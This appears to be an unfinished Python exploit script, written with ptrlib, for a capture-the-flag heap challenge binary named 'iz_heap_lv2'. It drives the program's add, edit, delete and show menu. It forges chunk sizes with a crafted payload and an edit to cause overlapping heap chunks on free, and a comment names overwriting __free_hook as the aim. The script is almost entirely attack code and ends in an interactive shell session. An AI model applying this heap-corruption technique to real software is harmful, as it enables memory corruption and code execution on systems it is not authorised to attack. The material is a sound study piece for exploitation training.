from ptrlib import *

def add(size, data):
    sock.sendlineafter("Choice: \n", "1")
    sock.sendlineafter("size: ", str(size))
    sock.sendafter("data: ", data)

def edit(index, data):
    sock.sendlineafter("Choice: \n", "2")
    sock.sendlineafter("index: ", str(index))
    sock.sendafter("data: ", data)

def delete(index):
    sock.sendlineafter("Choice: \n", "3")
    sock.sendlineafter("index: ", str(index))

def show(index):
    sock.sendlineafter("Choice: \n", "4")
    sock.sendlineafter("index: ", str(index))
    sock.recvuntil("Data: ")
    return sock.recvline()

libc = ELF("./libc.so.6")
libc_main_arena = 0x3ebc40
delta = 0x60
sock = Process("./iz_heap_lv2")

# overwrite __free_hook
#add(0x17, "X") # 0
payload = b'A' * 0x4f0 + p64(0x500)
add(0x4f7, "A") # 1
add(0x28, "B") # 2
add(0x4f7, payload) # 3
add(0x28, "D") # 4
delete(0)
edit(1, b"A" * 0x20 + p64(0x500 + 0x30))
delete(2)

sock.interactive()
